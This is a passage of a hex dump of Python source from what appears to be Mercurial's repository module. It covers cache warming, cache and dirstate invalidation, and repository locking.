-00019f10: 5d20 3c20 6c65 6e28 7365 6c66 293a 0a20  ] < len(self):. 
-00019f20: 2020 2020 2020 2020 2020 2020 2020 2023                 #
-00019f30: 2061 6363 6573 7369 6e67 2074 6865 2027   accessing the '
-00019f40: 7365 7276 6564 2720 6272 616e 6368 6d61  served' branchma
-00019f50: 7020 7368 6f75 6c64 2072 6566 7265 7368  p should refresh
-00019f60: 2061 6c6c 2074 6865 206f 7468 6572 732c   all the others,
-00019f70: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00019f80: 2073 656c 662e 7569 2e64 6562 7567 2862   self.ui.debug(b
-00019f90: 2775 7064 6174 696e 6720 7468 6520 6272  'updating the br
-00019fa0: 616e 6368 2063 6163 6865 5c6e 2729 0a20  anch cache\n'). 
-00019fb0: 2020 2020 2020 2020 2020 2020 2020 2073                 s
-00019fc0: 656c 662e 6669 6c74 6572 6564 2862 2773  elf.filtered(b's
-00019fd0: 6572 7665 6427 292e 6272 616e 6368 6d61  erved').branchma
-00019fe0: 7028 290a 2020 2020 2020 2020 2020 2020  p().            
-00019ff0: 2020 2020 7365 6c66 2e66 696c 7465 7265      self.filtere
-0001a000: 6428 6227 7365 7276 6564 2e68 6964 6465  d(b'served.hidde
-0001a010: 6e27 292e 6272 616e 6368 6d61 7028 290a  n').branchmap().
-0001a020: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001a030: 2320 666c 7573 6820 616c 6c20 706f 7373  # flush all poss
-0001a040: 6962 6c79 2064 656c 6179 6564 2077 7269  ibly delayed wri
-0001a050: 7465 2e0a 2020 2020 2020 2020 2020 2020  te..            
-0001a060: 2020 2020 7365 6c66 2e5f 6272 616e 6368      self._branch
-0001a070: 6361 6368 6573 2e77 7269 7465 5f64 656c  caches.write_del
-0001a080: 6179 6564 2873 656c 6629 0a0a 2020 2020  ayed(self)..    
-0001a090: 2020 2020 6966 2072 6570 6f73 6974 6f72      if repositor
-0001a0a0: 792e 4341 4348 455f 4348 414e 4745 4c4f  y.CACHE_CHANGELO
-0001a0b0: 475f 4341 4348 4520 696e 2063 6163 6865  G_CACHE in cache
-0001a0c0: 733a 0a20 2020 2020 2020 2020 2020 2073  s:.            s
-0001a0d0: 656c 662e 6368 616e 6765 6c6f 672e 7570  elf.changelog.up
-0001a0e0: 6461 7465 5f63 6163 6865 7328 7472 616e  date_caches(tran
-0001a0f0: 7361 6374 696f 6e3d 7472 290a 0a20 2020  saction=tr)..   
-0001a100: 2020 2020 2069 6620 7265 706f 7369 746f       if reposito
-0001a110: 7279 2e43 4143 4845 5f4d 414e 4946 4553  ry.CACHE_MANIFES
-0001a120: 544c 4f47 5f43 4143 4845 2069 6e20 6361  TLOG_CACHE in ca
-0001a130: 6368 6573 3a0a 2020 2020 2020 2020 2020  ches:.          
-0001a140: 2020 7365 6c66 2e6d 616e 6966 6573 746c    self.manifestl
-0001a150: 6f67 2e75 7064 6174 655f 6361 6368 6573  og.update_caches
-0001a160: 2874 7261 6e73 6163 7469 6f6e 3d74 7229  (transaction=tr)
-0001a170: 0a0a 2020 2020 2020 2020 6966 2072 6570  ..        if rep
-0001a180: 6f73 6974 6f72 792e 4341 4348 455f 5245  ository.CACHE_RE
-0001a190: 565f 4252 414e 4348 2069 6e20 6361 6368  V_BRANCH in cach
-0001a1a0: 6573 3a0a 2020 2020 2020 2020 2020 2020  es:.            
-0001a1b0: 7262 6320 3d20 756e 6669 2e72 6576 6272  rbc = unfi.revbr
-0001a1c0: 616e 6368 6361 6368 6528 290a 2020 2020  anchcache().    
-0001a1d0: 2020 2020 2020 2020 666f 7220 7220 696e          for r in
-0001a1e0: 2075 6e66 692e 6368 616e 6765 6c6f 673a   unfi.changelog:
-0001a1f0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0001a200: 2072 6263 2e62 7261 6e63 6869 6e66 6f28   rbc.branchinfo(
-0001a210: 7229 0a20 2020 2020 2020 2020 2020 2072  r).            r
-0001a220: 6263 2e77 7269 7465 2829 0a0a 2020 2020  bc.write()..    
-0001a230: 2020 2020 6966 2072 6570 6f73 6974 6f72      if repositor
-0001a240: 792e 4341 4348 455f 4655 4c4c 5f4d 414e  y.CACHE_FULL_MAN
-0001a250: 4946 4553 5420 696e 2063 6163 6865 733a  IFEST in caches:
-0001a260: 0a20 2020 2020 2020 2020 2020 2023 2065  .            # e
-0001a270: 6e73 7572 6520 7468 6520 776f 726b 696e  nsure the workin
-0001a280: 6720 636f 7079 2070 6172 656e 7473 2061  g copy parents a
-0001a290: 7265 2069 6e20 7468 6520 6d61 6e69 6665  re in the manife
-0001a2a0: 7374 6675 6c6c 7465 7874 6361 6368 650a  stfulltextcache.
-0001a2b0: 2020 2020 2020 2020 2020 2020 666f 7220              for 
-0001a2c0: 6374 7820 696e 2073 656c 665b 6227 2e27  ctx in self[b'.'
-0001a2d0: 5d2e 7061 7265 6e74 7328 293a 0a20 2020  ].parents():.   
-0001a2e0: 2020 2020 2020 2020 2020 2020 2063 7478               ctx
-0001a2f0: 2e6d 616e 6966 6573 7428 2920 2023 2061  .manifest()  # a
-0001a300: 6363 6573 7369 6e67 2074 6865 206d 616e  ccessing the man
-0001a310: 6966 6573 7420 6973 2065 6e6f 7567 680a  ifest is enough.
-0001a320: 0a20 2020 2020 2020 2069 6620 7265 706f  .        if repo
-0001a330: 7369 746f 7279 2e43 4143 4845 5f46 494c  sitory.CACHE_FIL
-0001a340: 455f 4e4f 4445 5f54 4147 5320 696e 2063  E_NODE_TAGS in c
-0001a350: 6163 6865 733a 0a20 2020 2020 2020 2020  aches:.         
-0001a360: 2020 2023 2061 6363 6573 7369 6e67 2066     # accessing f
-0001a370: 6e6f 6465 2063 6163 6865 2077 6172 6d73  node cache warms
-0001a380: 2074 6865 2063 6163 6865 0a20 2020 2020   the cache.     
-0001a390: 2020 2020 2020 2074 6167 736d 6f64 2e66         tagsmod.f
-0001a3a0: 6e6f 6465 7265 7673 2873 656c 662e 7569  noderevs(self.ui
-0001a3b0: 2c20 756e 6669 2c20 756e 6669 2e63 6861  , unfi, unfi.cha
-0001a3c0: 6e67 656c 6f67 2e72 6576 7328 2929 0a0a  ngelog.revs())..
-0001a3d0: 2020 2020 2020 2020 6966 2072 6570 6f73          if repos
-0001a3e0: 6974 6f72 792e 4341 4348 455f 5441 4753  itory.CACHE_TAGS
-0001a3f0: 5f44 4546 4155 4c54 2069 6e20 6361 6368  _DEFAULT in cach
-0001a400: 6573 3a0a 2020 2020 2020 2020 2020 2020  es:.            
-0001a410: 2320 6163 6365 7373 696e 6720 7461 6773  # accessing tags
-0001a420: 2077 6172 6d20 7468 6520 6361 6368 650a   warm the cache.
-0001a430: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-0001a440: 2e74 6167 7328 290a 2020 2020 2020 2020  .tags().        
-0001a450: 6966 2072 6570 6f73 6974 6f72 792e 4341  if repository.CA
-0001a460: 4348 455f 5441 4753 5f53 4552 5645 4420  CHE_TAGS_SERVED 
-0001a470: 696e 2063 6163 6865 733a 0a20 2020 2020  in caches:.     
-0001a480: 2020 2020 2020 2073 656c 662e 6669 6c74         self.filt
-0001a490: 6572 6564 2862 2773 6572 7665 6427 292e  ered(b'served').
-0001a4a0: 7461 6773 2829 0a0a 2020 2020 2020 2020  tags()..        
-0001a4b0: 6966 2072 6570 6f73 6974 6f72 792e 4341  if repository.CA
-0001a4c0: 4348 455f 4252 414e 4348 4d41 505f 414c  CHE_BRANCHMAP_AL
-0001a4d0: 4c20 696e 2063 6163 6865 733a 0a20 2020  L in caches:.   
-0001a4e0: 2020 2020 2020 2020 2023 2054 6865 2043           # The C
-0001a4f0: 4143 4845 5f42 5241 4e43 484d 4150 5f41  ACHE_BRANCHMAP_A
-0001a500: 4c4c 2075 7064 6174 6573 206c 617a 696c  LL updates lazil
-0001a510: 792d 6c6f 6164 6564 2063 6163 6865 7320  y-loaded caches 
-0001a520: 696d 6d65 6469 6174 656c 792c 0a20 2020  immediately,.   
-0001a530: 2020 2020 2020 2020 2023 2073 6f20 7765           # so we
-0001a540: 2772 6520 666f 7263 696e 6720 6120 7772  're forcing a wr
-0001a550: 6974 6520 746f 2063 6175 7365 2074 6865  ite to cause the
-0001a560: 7365 2063 6163 6865 7320 746f 2062 6520  se caches to be 
-0001a570: 7761 726d 6564 2075 700a 2020 2020 2020  warmed up.      
-0001a580: 2020 2020 2020 2320 6576 656e 2069 6620        # even if 
-0001a590: 7468 6579 2068 6176 656e 2774 2065 7870  they haven't exp
-0001a5a0: 6c69 6369 746c 7920 6265 656e 2072 6571  licitly been req
-0001a5b0: 7565 7374 6564 2079 6574 2028 6966 2074  uested yet (if t
-0001a5c0: 6865 7927 7665 0a20 2020 2020 2020 2020  hey've.         
-0001a5d0: 2020 2023 206e 6576 6572 2062 6565 6e20     # never been 
-0001a5e0: 7573 6564 2062 7920 6867 2c20 7468 6579  used by hg, they
-0001a5f0: 2077 6f6e 2774 2065 7665 7220 6861 7665   won't ever have
-0001a600: 2062 6565 6e20 7772 6974 7465 6e2c 2065   been written, e
-0001a610: 7665 6e20 6966 0a20 2020 2020 2020 2020  ven if.         
-0001a620: 2020 2023 2074 6865 7927 7265 2061 2073     # they're a s
-0001a630: 7562 7365 7420 6f66 2061 6e6f 7468 6572  ubset of another
-0001a640: 206b 696e 6420 6f66 2063 6163 6865 2074   kind of cache t
-0001a650: 6861 7420 2a68 6173 2a20 6265 656e 2075  hat *has* been u
-0001a660: 7365 6429 2e0a 2020 2020 2020 2020 2020  sed)..          
-0001a670: 2020 666f 7220 6669 6c74 2069 6e20 7265    for filt in re
-0001a680: 706f 7669 6577 2e66 696c 7465 7274 6162  poview.filtertab
-0001a690: 6c65 2e6b 6579 7328 293a 0a20 2020 2020  le.keys():.     
-0001a6a0: 2020 2020 2020 2020 2020 2066 696c 7465             filte
-0001a6b0: 7265 6420 3d20 7365 6c66 2e66 696c 7465  red = self.filte
-0001a6c0: 7265 6428 6669 6c74 290a 2020 2020 2020  red(filt).      
-0001a6d0: 2020 2020 2020 2020 2020 6669 6c74 6572            filter
-0001a6e0: 6564 2e62 7261 6e63 686d 6170 2829 2e77  ed.branchmap().w
-0001a6f0: 7269 7465 2866 696c 7465 7265 6429 0a0a  rite(filtered)..
-0001a700: 2020 2020 6465 6620 696e 7661 6c69 6461      def invalida
-0001a710: 7465 6361 6368 6573 2873 656c 6629 3a0a  tecaches(self):.
-0001a720: 2020 2020 2020 2020 6966 2027 5f74 6167          if '_tag
-0001a730: 7363 6163 6865 2720 696e 2076 6172 7328  scache' in vars(
-0001a740: 7365 6c66 293a 0a20 2020 2020 2020 2020  self):.         
-0001a750: 2020 2023 2063 616e 2774 2075 7365 2064     # can't use d
-0001a760: 656c 6174 7472 206f 6e20 7072 6f78 790a  elattr on proxy.
-0001a770: 2020 2020 2020 2020 2020 2020 6465 6c20              del 
-0001a780: 7365 6c66 2e5f 5f64 6963 745f 5f5b 275f  self.__dict__['_
-0001a790: 7461 6773 6361 6368 6527 5d0a 0a20 2020  tagscache']..   
-0001a7a0: 2020 2020 2073 656c 662e 5f62 7261 6e63       self._branc
-0001a7b0: 6863 6163 6865 732e 636c 6561 7228 290a  hcaches.clear().
-0001a7c0: 2020 2020 2020 2020 7365 6c66 2e69 6e76          self.inv
-0001a7d0: 616c 6964 6174 6576 6f6c 6174 696c 6573  alidatevolatiles
-0001a7e0: 6574 7328 290a 2020 2020 2020 2020 7365  ets().        se
-0001a7f0: 6c66 2e5f 7370 6172 7365 7369 676e 6174  lf._sparsesignat
-0001a800: 7572 6563 6163 6865 2e63 6c65 6172 2829  urecache.clear()
-0001a810: 0a0a 2020 2020 6465 6620 696e 7661 6c69  ..    def invali
-0001a820: 6461 7465 766f 6c61 7469 6c65 7365 7473  datevolatilesets
-0001a830: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
-0001a840: 7365 6c66 2e66 696c 7465 7265 6472 6576  self.filteredrev
-0001a850: 6361 6368 652e 636c 6561 7228 290a 2020  cache.clear().  
-0001a860: 2020 2020 2020 6f62 736f 6c65 7465 2e63        obsolete.c
-0001a870: 6c65 6172 6f62 7363 6163 6865 7328 7365  learobscaches(se
-0001a880: 6c66 290a 2020 2020 2020 2020 7365 6c66  lf).        self
-0001a890: 2e5f 7175 6963 6b5f 6163 6365 7373 5f63  ._quick_access_c
-0001a8a0: 6861 6e67 6569 645f 696e 7661 6c69 6461  hangeid_invalida
-0001a8b0: 7465 2829 0a0a 2020 2020 6465 6620 696e  te()..    def in
-0001a8c0: 7661 6c69 6461 7465 6469 7273 7461 7465  validatedirstate
-0001a8d0: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
-0001a8e0: 2222 2249 6e76 616c 6964 6174 6573 2074  """Invalidates t
-0001a8f0: 6865 2064 6972 7374 6174 652c 2063 6175  he dirstate, cau
-0001a900: 7369 6e67 2074 6865 206e 6578 7420 6361  sing the next ca
-0001a910: 6c6c 2074 6f20 6469 7273 7461 7465 0a20  ll to dirstate. 
-0001a920: 2020 2020 2020 2074 6f20 6368 6563 6b20         to check 
-0001a930: 6966 2069 7420 7761 7320 6d6f 6469 6669  if it was modifi
-0001a940: 6564 2073 696e 6365 2074 6865 206c 6173  ed since the las
-0001a950: 7420 7469 6d65 2069 7420 7761 7320 7265  t time it was re
-0001a960: 6164 2c0a 2020 2020 2020 2020 7265 7265  ad,.        rere
-0001a970: 6164 696e 6720 6974 2069 6620 6974 2068  ading it if it h
-0001a980: 6173 2e0a 0a20 2020 2020 2020 2054 6869  as...        Thi
-0001a990: 7320 6973 2064 6966 6665 7265 6e74 2074  s is different t
-0001a9a0: 6f20 6469 7273 7461 7465 2e69 6e76 616c  o dirstate.inval
-0001a9b0: 6964 6174 6528 2920 7468 6174 2069 7420  idate() that it 
-0001a9c0: 646f 6573 6e27 7420 616c 7761 7973 0a20  doesn't always. 
-0001a9d0: 2020 2020 2020 2072 6572 6561 6473 2074         rereads t
-0001a9e0: 6865 2064 6972 7374 6174 652e 2055 7365  he dirstate. Use
-0001a9f0: 2064 6972 7374 6174 652e 696e 7661 6c69   dirstate.invali
-0001aa00: 6461 7465 2829 2069 6620 796f 7520 7761  date() if you wa
-0001aa10: 6e74 2074 6f0a 2020 2020 2020 2020 6578  nt to.        ex
-0001aa20: 706c 6963 6974 6c79 2072 6561 6420 7468  plicitly read th
-0001aa30: 6520 6469 7273 7461 7465 2061 6761 696e  e dirstate again
-0001aa40: 2028 692e 652e 2072 6573 746f 7269 6e67   (i.e. restoring
-0001aa50: 2069 7420 746f 2061 2070 7265 7669 6f75   it to a previou
-0001aa60: 730a 2020 2020 2020 2020 6b6e 6f77 6e20  s.        known 
-0001aa70: 676f 6f64 2073 7461 7465 292e 2222 220a  good state).""".
-0001aa80: 2020 2020 2020 2020 756e 6669 203d 2073          unfi = s
-0001aa90: 656c 662e 756e 6669 6c74 6572 6564 2829  elf.unfiltered()
-0001aaa0: 0a20 2020 2020 2020 2069 6620 2764 6972  .        if 'dir
-0001aab0: 7374 6174 6527 2069 6e20 756e 6669 2e5f  state' in unfi._
-0001aac0: 5f64 6963 745f 5f3a 0a20 2020 2020 2020  _dict__:.       
-0001aad0: 2020 2020 2061 7373 6572 7420 6e6f 7420       assert not 
-0001aae0: 7365 6c66 2e64 6972 7374 6174 652e 6973  self.dirstate.is
-0001aaf0: 5f63 6861 6e67 696e 675f 616e 790a 2020  _changing_any.  
-0001ab00: 2020 2020 2020 2020 2020 6465 6c20 756e            del un
-0001ab10: 6669 2e5f 5f64 6963 745f 5f5b 2764 6972  fi.__dict__['dir
-0001ab20: 7374 6174 6527 5d0a 0a20 2020 2064 6566  state']..    def
-0001ab30: 2069 6e76 616c 6964 6174 6528 7365 6c66   invalidate(self
-0001ab40: 2c20 636c 6561 7266 696c 6563 6163 6865  , clearfilecache
-0001ab50: 3d46 616c 7365 293a 0a20 2020 2020 2020  =False):.       
-0001ab60: 2022 2222 496e 7661 6c69 6461 7465 7320   """Invalidates 
-0001ab70: 626f 7468 2073 746f 7265 2061 6e64 206e  both store and n
-0001ab80: 6f6e 2d73 746f 7265 2070 6172 7473 206f  on-store parts o
-0001ab90: 7468 6572 2074 6861 6e20 6469 7273 7461  ther than dirsta
-0001aba0: 7465 0a0a 2020 2020 2020 2020 4966 2061  te..        If a
-0001abb0: 2074 7261 6e73 6163 7469 6f6e 2069 7320   transaction is 
-0001abc0: 7275 6e6e 696e 672c 2069 6e76 616c 6964  running, invalid
-0001abd0: 6174 696f 6e20 6f66 2073 746f 7265 2069  ation of store i
-0001abe0: 7320 6f6d 6974 7465 642c 0a20 2020 2020  s omitted,.     
-0001abf0: 2020 2062 6563 6175 7365 2064 6973 6361     because disca
-0001ac00: 7264 696e 6720 696e 2d6d 656d 6f72 7920  rding in-memory 
-0001ac10: 6368 616e 6765 7320 6d69 6768 7420 6361  changes might ca
-0001ac20: 7573 6520 696e 636f 6e73 6973 7465 6e63  use inconsistenc
-0001ac30: 790a 2020 2020 2020 2020 2865 2e67 2e20  y.        (e.g. 
-0001ac40: 696e 636f 6d70 6c65 7465 2066 6e63 6163  incomplete fncac
-0001ac50: 6865 2063 6175 7365 7320 756e 696e 7465  he causes uninte
-0001ac60: 6e74 696f 6e61 6c20 6661 696c 7572 652c  ntional failure,
-0001ac70: 2062 7574 0a20 2020 2020 2020 2072 6564   but.        red
-0001ac80: 756e 6461 6e74 206f 6e65 2064 6f65 736e  undant one doesn
-0001ac90: 2774 292e 0a20 2020 2020 2020 2022 2222  't)..        """
-0001aca0: 0a20 2020 2020 2020 2075 6e66 696c 7465  .        unfilte
-0001acb0: 7265 6420 3d20 7365 6c66 2e75 6e66 696c  red = self.unfil
-0001acc0: 7465 7265 6428 2920 2023 2061 6c6c 2066  tered()  # all f
-0001acd0: 696c 6520 6361 6368 6573 2061 7265 2073  ile caches are s
-0001ace0: 746f 7265 6420 756e 6669 6c74 6572 6564  tored unfiltered
-0001acf0: 0a20 2020 2020 2020 2066 6f72 206b 2069  .        for k i
-0001ad00: 6e20 6c69 7374 2873 656c 662e 5f66 696c  n list(self._fil
-0001ad10: 6563 6163 6865 2e6b 6579 7328 2929 3a0a  ecache.keys()):.
-0001ad20: 2020 2020 2020 2020 2020 2020 6966 2028              if (
-0001ad30: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0001ad40: 206b 203d 3d20 6227 6368 616e 6765 6c6f   k == b'changelo
-0001ad50: 6727 0a20 2020 2020 2020 2020 2020 2020  g'.             
-0001ad60: 2020 2061 6e64 2073 656c 662e 6375 7272     and self.curr
-0001ad70: 656e 7474 7261 6e73 6163 7469 6f6e 2829  enttransaction()
-0001ad80: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0001ad90: 2061 6e64 2073 656c 662e 6368 616e 6765   and self.change
-0001ada0: 6c6f 672e 5f64 656c 6179 6564 0a20 2020  log._delayed.   
-0001adb0: 2020 2020 2020 2020 2029 3a0a 2020 2020           ):.    
-0001adc0: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
-0001add0: 6520 6368 616e 6765 6c6f 6720 6f62 6a65  e changelog obje
-0001ade0: 6374 206d 6179 2073 746f 7265 2075 6e77  ct may store unw
-0001adf0: 7269 7474 656e 2072 6576 6973 696f 6e73  ritten revisions
-0001ae00: 2e20 5765 2064 6f6e 2774 0a20 2020 2020  . We don't.     
-0001ae10: 2020 2020 2020 2020 2020 2023 2077 616e             # wan
-0001ae20: 7420 746f 206c 6f73 6520 7468 656d 2e0a  t to lose them..
-0001ae30: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0001ae40: 2320 544f 444f 3a20 536f 6c76 6520 7468  # TODO: Solve th
-0001ae50: 6520 7072 6f62 6c65 6d20 696e 7374 6561  e problem instea
-0001ae60: 6420 6f66 2077 6f72 6b69 6e67 2061 726f  d of working aro
-0001ae70: 756e 6420 6974 2e0a 2020 2020 2020 2020  und it..        
-0001ae80: 2020 2020 2020 2020 636f 6e74 696e 7565          continue
-0001ae90: 0a0a 2020 2020 2020 2020 2020 2020 6966  ..            if
-0001aea0: 2063 6c65 6172 6669 6c65 6361 6368 653a   clearfilecache:
-0001aeb0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0001aec0: 2064 656c 2073 656c 662e 5f66 696c 6563   del self._filec
-0001aed0: 6163 6865 5b6b 5d0a 2020 2020 2020 2020  ache[k].        
-0001aee0: 2020 2020 7472 793a 0a20 2020 2020 2020      try:.       
-0001aef0: 2020 2020 2020 2020 2064 656c 6174 7472           delattr
-0001af00: 2875 6e66 696c 7465 7265 642c 206b 290a  (unfiltered, k).
-0001af10: 2020 2020 2020 2020 2020 2020 6578 6365              exce
-0001af20: 7074 2041 7474 7269 6275 7465 4572 726f  pt AttributeErro
-0001af30: 723a 0a20 2020 2020 2020 2020 2020 2020  r:.             
-0001af40: 2020 2070 6173 730a 2020 2020 2020 2020     pass.        
-0001af50: 7365 6c66 2e69 6e76 616c 6964 6174 6563  self.invalidatec
-0001af60: 6163 6865 7328 290a 2020 2020 2020 2020  aches().        
-0001af70: 6966 206e 6f74 2073 656c 662e 6375 7272  if not self.curr
-0001af80: 656e 7474 7261 6e73 6163 7469 6f6e 2829  enttransaction()
-0001af90: 3a0a 2020 2020 2020 2020 2020 2020 2320  :.            # 
-0001afa0: 544f 444f 3a20 4368 616e 6769 6e67 2063  TODO: Changing c
-0001afb0: 6f6e 7465 6e74 7320 6f66 2073 746f 7265  ontents of store
-0001afc0: 206f 7574 7369 6465 2074 7261 6e73 6163   outside transac
-0001afd0: 7469 6f6e 0a20 2020 2020 2020 2020 2020  tion.           
-0001afe0: 2023 2063 6175 7365 7320 696e 636f 6e73   # causes incons
-0001aff0: 6973 7465 6e63 792e 2057 6520 7368 6f75  istency. We shou
-0001b000: 6c64 206d 616b 6520 696e 2d6d 656d 6f72  ld make in-memor
-0001b010: 7920 7374 6f72 650a 2020 2020 2020 2020  y store.        
-0001b020: 2020 2020 2320 6368 616e 6765 7320 6465      # changes de
-0001b030: 7465 6374 6162 6c65 2c20 616e 6420 6162  tectable, and ab
-0001b040: 6f72 7420 6966 2063 6861 6e67 6564 2e0a  ort if changed..
-0001b050: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-0001b060: 2e73 746f 7265 2e69 6e76 616c 6964 6174  .store.invalidat
-0001b070: 6563 6163 6865 7328 290a 0a20 2020 2064  ecaches()..    d
-0001b080: 6566 2069 6e76 616c 6964 6174 6561 6c6c  ef invalidateall
-0001b090: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
-0001b0a0: 2222 2246 756c 6c79 2069 6e76 616c 6964  """Fully invalid
-0001b0b0: 6174 6573 2062 6f74 6820 7374 6f72 6520  ates both store 
-0001b0c0: 616e 6420 6e6f 6e2d 7374 6f72 6520 7061  and non-store pa
-0001b0d0: 7274 732c 2063 6175 7369 6e67 2074 6865  rts, causing the
-0001b0e0: 0a20 2020 2020 2020 2073 7562 7365 7175  .        subsequ
-0001b0f0: 656e 7420 6f70 6572 6174 696f 6e20 746f  ent operation to
-0001b100: 2072 6572 6561 6420 616e 7920 6f75 7473   reread any outs
-0001b110: 6964 6520 6368 616e 6765 732e 2222 220a  ide changes.""".
-0001b120: 2020 2020 2020 2020 2320 6578 7465 6e73          # extens
-0001b130: 696f 6e20 7368 6f75 6c64 2068 6f6f 6b20  ion should hook 
-0001b140: 7468 6973 2074 6f20 696e 7661 6c69 6461  this to invalida
-0001b150: 7465 2069 7473 2063 6163 6865 730a 2020  te its caches.  
-0001b160: 2020 2020 2020 7365 6c66 2e69 6e76 616c        self.inval
-0001b170: 6964 6174 6528 290a 2020 2020 2020 2020  idate().        
-0001b180: 7365 6c66 2e69 6e76 616c 6964 6174 6564  self.invalidated
-0001b190: 6972 7374 6174 6528 290a 0a20 2020 2040  irstate()..    @
-0001b1a0: 756e 6669 6c74 6572 6564 6d65 7468 6f64  unfilteredmethod
-0001b1b0: 0a20 2020 2064 6566 205f 7265 6672 6573  .    def _refres
-0001b1c0: 6866 696c 6563 6163 6865 7374 6174 7328  hfilecachestats(
-0001b1d0: 7365 6c66 2c20 7472 293a 0a20 2020 2020  self, tr):.     
-0001b1e0: 2020 2022 2222 5265 6c6f 6164 2073 7461     """Reload sta
-0001b1f0: 7473 206f 6620 6361 6368 6564 2066 696c  ts of cached fil
-0001b200: 6573 2073 6f20 7468 6174 2074 6865 7920  es so that they 
-0001b210: 6172 6520 666c 6167 6765 6420 6173 2076  are flagged as v
-0001b220: 616c 6964 2222 220a 2020 2020 2020 2020  alid""".        
-0001b230: 666f 7220 6b2c 2063 6520 696e 2073 656c  for k, ce in sel
-0001b240: 662e 5f66 696c 6563 6163 6865 2e69 7465  f._filecache.ite
-0001b250: 6d73 2829 3a0a 2020 2020 2020 2020 2020  ms():.          
-0001b260: 2020 6b20 3d20 7079 636f 6d70 6174 2e73    k = pycompat.s
-0001b270: 7973 7374 7228 6b29 0a20 2020 2020 2020  ysstr(k).       
-0001b280: 2020 2020 2069 6620 6b20 3d3d 2027 6469       if k == 'di
-0001b290: 7273 7461 7465 2720 6f72 206b 206e 6f74  rstate' or k not
-0001b2a0: 2069 6e20 7365 6c66 2e5f 5f64 6963 745f   in self.__dict_
-0001b2b0: 5f3a 0a20 2020 2020 2020 2020 2020 2020  _:.             
-0001b2c0: 2020 2063 6f6e 7469 6e75 650a 2020 2020     continue.    
-0001b2d0: 2020 2020 2020 2020 6365 2e72 6566 7265          ce.refre
-0001b2e0: 7368 2829 0a0a 2020 2020 6465 6620 5f6c  sh()..    def _l
-0001b2f0: 6f63 6b28 0a20 2020 2020 2020 2073 656c  ock(.        sel
-0001b300: 662c 0a20 2020 2020 2020 2076 6673 2c0a  f,.        vfs,.
-0001b310: 2020 2020 2020 2020 6c6f 636b 6e61 6d65          lockname
-0001b320: 2c0a 2020 2020 2020 2020 7761 6974 2c0a  ,.        wait,.
-0001b330: 2020 2020 2020 2020 7265 6c65 6173 6566          releasef
-0001b340: 6e2c 0a20 2020 2020 2020 2061 6371 7569  n,.        acqui
-0001b350: 7265 666e 2c0a 2020 2020 2020 2020 6465  refn,.        de
-0001b360: 7363 2c0a 2020 2020 293a 0a20 2020 2020  sc,.    ):.     
-0001b370: 2020 2074 696d 656f 7574 203d 2030 0a20     timeout = 0. 
-0001b380: 2020 2020 2020 2077 6172 6e74 696d 656f         warntimeo
-0001b390: 7574 203d 2030 0a20 2020 2020 2020 2069  ut = 0.        i
-0001b3a0: 6620 7761 6974 3a0a 2020 2020 2020 2020  f wait:.        
-0001b3b0: 2020 2020 7469 6d65 6f75 7420 3d20 7365      timeout = se
-0001b3c0: 6c66 2e75 692e 636f 6e66 6967 696e 7428  lf.ui.configint(
-0001b3d0: 6222 7569 222c 2062 2274 696d 656f 7574  b"ui", b"timeout
-0001b3e0: 2229 0a20 2020 2020 2020 2020 2020 2077  ").            w
-0001b3f0: 6172 6e74 696d 656f 7574 203d 2073 656c  arntimeout = sel
-0001b400: 662e 7569 2e63 6f6e 6669 6769 6e74 2862  f.ui.configint(b
-0001b410: 2275 6922 2c20 6222 7469 6d65 6f75 742e  "ui", b"timeout.
-0001b420: 7761 726e 2229 0a20 2020 2020 2020 2023  warn").        #
-0001b430: 2069 6e74 6572 6e61 6c20 636f 6e66 6967   internal config
-0001b440: 3a20 7569 2e73 6967 6e61 6c2d 7361 6665  : ui.signal-safe
-0001b450: 2d6c 6f63 6b0a 2020 2020 2020 2020 7369  -lock.        si
-0001b460: 676e 616c 7361 6665 203d 2073 656c 662e  gnalsafe = self.
-0001b470: 7569 2e63 6f6e 6669 6762 6f6f 6c28 6227  ui.configbool(b'
-0001b480: 7569 272c 2062 2773 6967 6e61 6c2d 7361  ui', b'signal-sa
-0001b490: 6665 2d6c 6f63 6b27 290a 0a20 2020 2020  fe-lock')..     
-0001b4a0: 2020 206c 203d 206c 6f63 6b6d 6f64 2e74     l = lockmod.t
-0001b4b0: 7279 6c6f 636b 280a 2020 2020 2020 2020  rylock(.        
-0001b4c0: 2020 2020 7365 6c66 2e75 692c 0a20 2020      self.ui,.   
-0001b4d0: 2020 2020 2020 2020 2076 6673 2c0a 2020           vfs,.  
-0001b4e0: 2020 2020 2020 2020 2020 6c6f 636b 6e61            lockna
-0001b4f0: 6d65 2c0a 2020 2020 2020 2020 2020 2020  me,.            
-0001b500: 7469 6d65 6f75 742c 0a20 2020 2020 2020  timeout,.       
-0001b510: 2020 2020 2077 6172 6e74 696d 656f 7574       warntimeout
-0001b520: 2c0a 2020 2020 2020 2020 2020 2020 7265  ,.            re
-0001b530: 6c65 6173 6566 6e3d 7265 6c65 6173 6566  leasefn=releasef
-0001b540: 6e2c 0a20 2020 2020 2020 2020 2020 2061  n,.            a
-0001b550: 6371 7569 7265 666e 3d61 6371 7569 7265  cquirefn=acquire
-0001b560: 666e 2c0a 2020 2020 2020 2020 2020 2020  fn,.            
-0001b570: 6465 7363 3d64 6573 632c 0a20 2020 2020  desc=desc,.     
-0001b580: 2020 2020 2020 2073 6967 6e61 6c73 6166         signalsaf
-0001b590: 653d 7369 676e 616c 7361 6665 2c0a 2020  e=signalsafe,.  
-0001b5a0: 2020 2020 2020 290a 2020 2020 2020 2020        ).        
-0001b5b0: 7265 7475 726e 206c 0a0a 2020 2020 6465  return l..    de
-0001b5c0: 6620 5f61 6674 6572 6c6f 636b 2873 656c  f _afterlock(sel
-0001b5d0: 662c 2063 616c 6c62 6163 6b29 3a0a 2020  f, callback):.  
-0001b5e0: 2020 2020 2020 2222 2261 6464 2061 2063        """add a c
-0001b5f0: 616c 6c62 6163 6b20 746f 2062 6520 7275  allback to be ru
-0001b600: 6e20 7768 656e 2074 6865 2072 6570 6f73  n when the repos
